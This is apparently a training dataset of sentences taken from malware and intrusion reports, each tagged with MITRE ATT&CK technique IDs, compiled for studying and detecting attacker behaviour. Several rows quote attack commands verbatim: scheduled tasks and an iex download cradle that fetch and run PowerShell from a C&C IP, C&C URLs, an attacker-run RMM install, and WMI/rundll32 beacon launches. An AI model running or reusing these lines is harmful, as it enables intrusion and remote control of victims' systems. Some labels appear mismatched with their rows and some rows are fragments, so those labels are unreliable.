text,label
"The following are the BIOS interrupt services used throughout the code: int 0x13 – read/write sectors on disk int 0x10 – display text int 0x19 – cause disk reboot int 0x16 – obtain keystrokes, and status of keyboard buffer The code first checks the CRYPT_FLAG in sector 32 to see whether it has been set to 1 (encrypted).",T1056.001
"Once the key is entered, the code attempts to decrypt the contents of Sector 33, which were previously encrypted using Salsa20 key.","T1027, T1140"
"Once the sector is decrypted, the code reads all 512 bytes of the sector and ensures that they all equal 0x7.",T1140
"If this is successful, the CRYPT_FLAG is set to 2 (decrypted), and the same key is used to decrypt the MFT.",T1140
"Furthermore, the original encoded MBR in Sector 34 is also decoded, and placed back into Sector 0, as shown below.","T1027, T1140"
.vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip,T1083
The malware only targets fixed drives on the system.,T1083
The malware will first start enumerating files in the directory it is being executed from.,T1083
"The following steps are taken to encrypt the individual files: Gets file handle Gets the file size Creates a file mapping of the file with PAGE_READWRITE protection Maps the view of the file mapping with FILE_MAP_WRITE | FILE_MAP_READ access Calls CryptEncrypt to encrypt the contents of the file using AES-128 Once the files in a folder are encrypted, the ransomware drops a ransomware note in a file named README.txt.",T1106
The <HH:MM> value depends on the second parameter when being invoked by rundll32.exe.,T1218.011
"If the second parameter is 30, the scheduled task will trigger 30 minutes after the malware execution.",T1053.005
"However, if no second parameter is provided, the scheduled task is set to trigger 60 minutes after the malware execution by default.",T1053.005
Explanation of schtask parameters: /TN → taskname (not providing a custom name forces Windows to provide a random GUID as a name) /TR → taskrun.,T1053.005
Path and filename of the task to be run /ST → starttime Explanation of shutdown.exe parameters:,T1053.005
"/r → reboot after shutdown /f → forces running applications to close In addition, it also invokes the API NTRaiseHardError.",T1106
This is an undocumented Windows API that causes the system to reboot.,T1106
"If the API fails to execute, the malware calls InitiateSystemShutdownExW with the flag set to reboot the machine.",T1106
"For instance, immediately after execution, it loads itself in memory, and deletes itself from the disk.",T1027
"Once the contents of its resource section are decompressed and written to disk, it zeros out the memory buffer containing the decompressed PE files.",T1140
The malware also spawns cmd.exe to execute the following command:,T1059.003
They adopt multiple approaches to obfuscate their tools and eliminate their footprint after finishing the operation.,T1027
"The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing.","T1027, T1106"
"In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts.",T1484.001
"Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information.",T1005
"Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into rundll32.exe.","T1055, T1204.002"
Shellcode which is used for code injection.,"T1055, T1484.001"
"Propagation through GPO In early 2022, we further observed new TTPs used to spread malware in the victim’s environment.",T1484.001
"Once they successfully compromise the domain controller, they will submit immediate tasks to the hosts in the domain through GPO as seen in Figure 5, As the hosts receive the task through GPO, they will run a PowerShell script named “co.ps1” and create scheduled tasks for persistence. Figure 4.","T1484.001, T1053.005"
PowerShell script to create a ImmediateTask through GPO,T1053.005
"As shown in Figure 6, threat actors use multi-layered AES encryption and base64 encoding to obfuscate “co.ps1”.",T1027
Heavy obfuscation in a simple but useful anti-analysis approach makes it difficult for security products to detect their scripts.,T1027
Heavily obfuscated PowerShell script Figure 7.,T1027
Cleaned content of co.ps1 Earth Zhulong adopted DLL sideloading techniques to run their malware.,T1574.002
"The malicious DLL “gtn.dll”, which we named as “ShellFang”, loads when a legitimate executable is launched.",T1574.002
"It then calls the export function, “Go”, to start the loading procedure of the encrypted payload to decrypt the payload called “lengs.medil.xml”, which is the Cobalt Strike beacon. Figure 8. win.exe file information Figure 9. win.exe will call the malicious export function in gtn.dll Evolution of ShellFang loader During the investigation, we found that Earth Zhulong started targeting Southeast Asian firms in 2020.","T1027, T1140"
"Although they always used DLL sideloading to launch their malware, they never stopped changing the code structure of their shellcode loader.",T1574.002
It would read the encrypted payload (“nkford.nlp” is the payload in this case) then decrypt it and run it in the memory.,"T1027, T1140"
"They changed the decryption function into RC4 instead of the original XOR, but the code structure was basically the same as the previous variant.",T1140
"In this variant, more anti-analysis techniques were added to strengthen their loader, including API hashing and execution flow obfuscation through exception mechanism.",T1027
Threat actors intentionally raise exceptions to interrupt malware analysts and obfuscate the execution flow of the program.,T1027
Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.,"T1027, T1106"
"The payload will be decrypted with RC4 algorithm, and the final payload is an HTTPs Cobalt Strike beacon.","T1140, T1071.001"
A loop of intentional exception triggers to obfuscate control flow of program.,T1027
Necessary APIs will be dynamically resolved during execution.,T1027
"Hacking Tools Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts.",T1090
"It supports proxy (Socks5), upload/download file and remote shell functions.","T1090, T1105, T1059.003"
"Furthermore, the configuration file will be deleted once it is loaded into memory for fear of leaking network infrastructures.",T1070.004
-to=0 -cg=1 Information defined in the configuration file.,T1027
"Themida-packed EarthWorm During our investigation, we found they also use the notorious network-penetration tool, “EarthWorm”.",T1027
EarthWorm is a simple network tunnel tool with SOCKS v5 server and port transfer developed by a Chinese engineer.,T1090
"In order to avoid being detected by security products, threat actors use Themida packer to obfuscate the signature used for detection.",T1027
"This information stealer is compiled with Python 3.10 and packed by noted tools, “PyInstaller”, used to convert python script to be a standalone executable.",T1027
"After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim’s Oracle database.",T1005
"After finishing the operation, they will clean the intrusion footprint and delete important files, including payload and network configuration files, to avoid leaking any information to analysts.",T1070.004
Obfuscated PowerShell script used to clean the footprint on Domain Controller Figure 18.,T1027
"In addition, we reviewed reports published around that time and found the decryption algorithm in ShellFang was once used in the campaign by 1937CN, which was revealed by Fortinet in 2017.",T1140
"In the past 2 years, they always have used DLL sideloading as their major technique to launch their malware.",T1574.002
"However, they continued updating their tools and even added more anti-analysis techniques in their latest tools including multi-layer obfuscation, API obfuscation, and execution flow obfuscation by raising exceptions intentionally.",T1027
We also found they compromise the domain controller in the victim’s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO.,T1484.001
"Furthermore, Python and Go-lang executables usually compile all necessary libraries in a single binary, making malware classification more difficult for analysts and resulting in a large binary.",T1027
"Based on the victimology and usage of a highly similar decryption algorithm, we believe that Earth Zhulong is related to the hacking group known as “1937CN”.",T1140
"Interestingly, the folder with the backdoor contained two other tools: Autoruns by Sysinternals, and HRSWord, which is a part of the Chinese Huorong Network Technology protection suite, and is often used by various actors to disable endpoint protection tools.",T1562.001
"The TinyNote backdoor is a basic remote shell, limited in capabilities: it enables the actors to fingerprint the infected machine, set up persistence, and establish two different ways to execute commands received from the C&C server.",T1059.003
"SmadAV evasion At the beginning of its execution, the malware starts a function called bypassSMADAV, whose purpose is to bypass the Indonesian antivirus Smadav.",T1106
"It’s worth mentioning that in previous operations, the actors used SmadAV for their own purposes, forcing its component SmadAVprotect32.exe to side-load their malicious DLL.",T1574.002
"For every problematic window found, the antivirus checks if the window is visible with the API function IsWindowVisible.",T1106
This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.,T1055
"These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB:",T1106
Figure 2 – A piece of malware code creates a specially crafted window to bypass the smadAV.,T1106
"Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.",T1106
"But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.",T1106
"Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from robots.txt from different C&C servers, most likely to eliminate a single point of failure: schtasks /Create",T1053.005
"/TN test /SC MINUTE /MO 15 /TR ""powershell \""$r=[System.",T1053.005
"Net.WebRequest]::Create(\\\""http://103.159.132.91/Robots.txt\\\"");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\"""" /f At the time of execution, both servers returned the same code pointing to the third server: C:\Windows\System32\cmd.exe /c ""start powershell.exe -nop",T1059.003
"-c set-alias exi iex;`$v1='iex (new-object net.webclient).dow';`$v2='nloadstring(''http://';`$v3='103.159.132.91/robots1.txt'')';exi(`$v1+`$v2+`$v3);"" The final payload returned is a lightweight PowerShell backdoor, which retrieves a list of commands from the CMD header from the C&C server response, executes them with Invoke-Expression, concatenates the outputs with '_n1w_' string, and sends them back to the server in POST request: $WindowState = '[DllImport(""user32.dll"")]","T1105, T1071.001"
"Finally, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create",T1053.005
"/TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe"" /f Second mode: the backdoor This mode happens after the malware has achieved persistence and is running from a “zip” path.",T1053.005
"First, the malware enumerates the system for the following data and concatenates it to one string:",T1033
"The current system username The current username home folder The system’s network interfaces (name, MacAddress, description)","T1033, T1082"
It then picks one random C&C URL out of the three available and constructs a GET request: http://5.188.33.190/api.php http://103.169.90.132/api.php http://103.159.132.91/api.php,T1071.001
"Safari/537.36 The expected result from the server is a JSON with the following structure: {""msg"":""[BASE64-ENCODED COMMAND]""} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop.",T1140
"The ransomware was deployed using DLL side-loading of a Cortex XDR Dump Service Tool, a signed commercial security product, a loading method which is not commonly used to load ransomware.",T1574.002
"Execution Flow As observed in the wild, Rorschach execution uses these three files: cy.exe – Cortex XDR Dump Service Tool version 7.3.0.16740, abused to side-load winutils.dll winutils.dll – Packed Rorschach loader and injector, used to decrypt and inject the ransomware.","T1574.002, T1027"
"Upon execution of cy.exe, due to DLL side-loading, the loader/injector winutils.dll is loaded into memory and runs in the context of cy.exe.",T1574.002
"The main Rorschach payload config.ini is subsequently loaded into memory as well, decrypted and injected into notepad.exe, where the ransomware logic begins.","T1055, T1140"
"Delete shadow volumes and backups to harden recovery, using legitimate Windows tools such as vssadmin.exe, bcdedit.exe, wmic.exe, and wbadmin.exe Run wevutil.exe to clear the following Windows event logs: Application, Security, System and Windows Powershell.",T1562.001
"Disable the Windows firewall, using netsh.exe Self-propagation When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.","T1562.001, T1484.001"
"Similar functionality was linked in the past to LockBit 2.0, although the Rorschach Ransomware GPO deployment is carried out differently, as described below: Rorschach copies its files into the scripts folder of the DC, and deletes them from the original location.",T1070.004
Rorschach then creates a group policy (see Appendix C) that copies itself into the %Public% folder of all workstations in the domain.,T1484.001
The ransomware creates another group policy in an attempt to kill a list of predefined list of processes.,T1484.001
This is done by creating a schedule task invoking taskkill.exe.,T1053.005
"Finally, Rorschach creates another group policy that registers a scheduled task which runs immediately and upon user logon, to run Rorschach’s main executable with the relevant arguments.","T1484.001, T1053.005"
"First, the initial loader/injector winutils.dll is protected with UPX-style packing.",T1027
"After unpacking, the sample loads and decrypts config.ini, which contains the ransomware logic.","T1027, T1140"
"After Rorschach is injected into notepad.exe, it’s still protected by VMProtect.",T1055
It makes direct system calls using the “syscall” instruction.,T1106
"The ransomware finds the relevant syscall numbers for NT APIs, mainly related to file manipulation.",T1106
"When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API.",T1106
"In other words, the malware first creates a syscall table for NT APIs used for file encryption: Figure 3 – Creation of syscall table for certain NT APIs.",T1106
The example below shows how the syscall numbers are used: Figure 5 – Example use of direct syscall.,"T1027, T1106"
"This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls.","T1027, T1059.003"
Command Line Arguments,T1059.003
"--nobk=0 Language Based Protection Before encrypting the target system, the sample runs two system checks that can halt its execution: It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to determine what language the user is using.",T1106
The WinAPI CryptGenRandom is utilized to generate cryptographically random bytes used as a per-victim private key.,T1106
"However, the list of processes to be stopped differs slightly, as Rorschach omits notepad.exe, which is used as a target for code injection.",T1057
"The final renaming of the encrypted machine files in Rorschach is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation, just like in LockBit v2.0.",T1106
"As noted before, Rorschach’s code is protected and obfuscated in a way that is unusual for ransomware, and is compiled with compiler optimization to favor speed and code inlining as much as possible.",T1027
"While Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets.",T1055
"Given that ROP-based attacks execute “RET” instructions without a prior “CALL” instruction, the running thread’s stack and the shadow stack values mismatch and so backward-edge CFI like CET effectively blocks this attack technique.",T1055
"Once the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.",T1055
"Once the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API.",T1055
"Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object (i.e. as a returned value from an invoked API).",T1055
"As part of the automated part of the exploit, in order to obtain the vfgadget’s this pointer, we have leaked the stack pointer and retrieved the this pointer as a static offset from the stack.",T1055
"Once we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments.",T1106
"5086014001000000 f0040becfb7f0000 ""edgehtml.dll"" Getting the PoC’s syntax The application accepts four parameters: a pointer to our counterfeit object (COOP) buffer, the vfgadget address, the Windows API address and its arguments.","T1106, T1055"
"public: virtual void trigger(char* a1) { callback(a); } }; The ‘trigger’ method from which we derive the vfgadget The class OffSec present in the project contains a trigger method which acts as a C-style function pointer that we can abuse to invoke any API we like, as we’ll see shortly.",T1106
"Remote access tools were used for command and control, such as Tactical RMM and Anydesk.",T1219
"Case Summary The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.","T1105, T1204.002"
"Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host.",T1547.001
"Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers.","T1016, T1082"
"Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading.",T1566.001
"Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.","T1057, T1059.003"
"Next, they proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData directory.",T1570
This beacon was then successfully executed via WMI and connected successfully to the threat actors server.,T1047
Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.,T1059.003
They then proceeded to dump credentials from the LSASS process on the host.,T1003.001
With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.,T1055
A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.,"T1570, T1078"
"The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL’s.",T1570
"On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment.",T1059.003
"On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.",T1219
On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.,T1219
"After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify hosts across the environment.","T1105, T1021.001"
"From there, the threat actors began connecting to other hosts via RDP, including the a backup server.",T1021.001
"After choosing a new server and connecting via RDP, the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.","T1105, T1021.001"
"Finally, locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed beginning the Quantum rasomware deployment to all hosts over SMB.","T1570, T1059.003"
"After ransomware deployment, the threat actors remained connected and did RDP to a few other servers and executed ProcessHacker.exe and a net command.",T1021.001
The Powershell script embedded within the LNK is a Base64 encoded script with various components split into different variables for obfuscation purposes.,T1027
The script will decode itself rather than depend on Powershell’s built-in ability to execute encoded scripts. ..,"T1027, T1140"
"Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}"" The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware.",T1204.002
Almost all the instances of Emotet included three enumeration commands executed: systeminfo ipconfig /all,"T1016, T1082"
"On the first day, Emotet established persistence via a run key.",T1547.001
"After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.",T1219
Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.,T1219
"""C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth 5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c",T1543.003
A service was also created for the agent.,T1543.003
Event 7045A service was installed in the system.,T1543.003
-m svcService Type: user mode serviceService Start Type: auto startService Account:,T1543.003
"LocalSystem Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent.",T1543.003
"Service Name: Mesh AgentService File Name: ""C:\Program Files\Mesh Agent\MeshAgent.exe""Service Type: user mode serviceService Start Type: auto startService Account:",T1543.003
"LocalSystem On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.","T1543.003, T1219"
"Service Name: AnyDesk ServiceService File Name: ""C:\Program Files (x86)\AnyDesk\AnyDesk.exe"" --serviceService",T1543.003
Type: user mode serviceService Start Type: auto startService Account:,T1543.003
"LocalSystem Privilege Escalation We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it.",T1543.003
One indicator is the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation.,T1003.001
"Defense Evasion Process Injection The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system.","T1055, T1070.004"
"The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.",T1055
"This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike.",T1218.011
"The following table summarizes the processes used for injection during this case: Injected Process Name Injection Payload C:\Windows\system32\winlogon.exe Cobalt Strike C:\Windows\System32\RuntimeBroker.exe Cobalt Strike C:\Windows\System32\svchost.exe Cobalt Strike C:\Windows\System32\taskhostw.exe Cobalt Strike C:\Windows\system32\dllhost.exe Cobalt Strike PowerTool PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.","T1105, T1055"
"This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files.",T1070.004
北京华林保软件技术有限公司 Indicator Removal The threat actor was observed deleting files that had been dropped to disk.,T1027
"Credential Access Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.","T1003.001, T1055"
"The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report.",T1003.001
"We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.",T1003.001
"These were then repeated, seen occurring once a day from the Emotet host. systeminfo ipconfig /all","T1016, T1082"
"nltest /dclist: Multiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead.",T1033
"whoami /groups net group /domain net group ""domain computers"" /domain",T1033
ping COMPUTER.REDACTED.local Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike:,T1055
"Once on the domain controller, two batch files were run.",T1059.003
The first find.bat was used to run AdFind.exe for Active Directory discovery.,T1059.003
"IP_ADDRESS_1 C:\Windows\System32\mstsc mstsc.exe /v:IP_ADDRESS_2 C:\Windows\SysWOW64\explorer.exe ""C:\Windows\SysWOW64\explorer.exe"" \\IP_ADDRESS_1\C$ C:\Windows\SysWOW64\explorer.exe ""C:\Windows\SysWOW64\explorer.exe"" \\IP_ADDRESS_2\C$ Lateral Movement Cobalt Strike Remote Service Creation The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts.","T1569.002, T1218.011, T1570, T1059.003, T1543.003"
"C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA WMI","T1059.003, T1218.011"
"In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI.","T1570, T1047"
"wmic /node:IP_Address process call create ""cmd.exe /c start C:\Progradata\sc_https_x64.exe"" Remote Desktop Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment.","T1047, T1059.003, T1021.001"
"Collection On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents.",T1005
Both HTTP and HTTPS were observed to be used.,T1071.001
-m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth REDACTED This command reveals the floppasoftware.com domain used by the threat actor for the remote management of Tactical RMM Agent.,T1219
Using this RMM agent they proceeded to install AnyDesk on the host.,T1219
"MeshAgent.exe -kvm1 - Initiating Process File Name, column 6, row 12 ""MeshAgent.exe"" -b64exec cmVxdWlyZSgnd2luLWNvbnNvbGUnKS5oaWRlKCk7cmVxdWlyZSgnd2luLWRpc3BhdGNoZXInKS5jb25uZWN0KCczNzQ3Jyk7 The decoded base 64 content reveals commands for console access and connect actions.",T1140
They started by connecting to a new server via RDP from the server they just used Tactical RMM to deploy Anydesk.,T1021.001
"Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don’t Sleep.",T1021.001
"Finally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“.",T1059.003
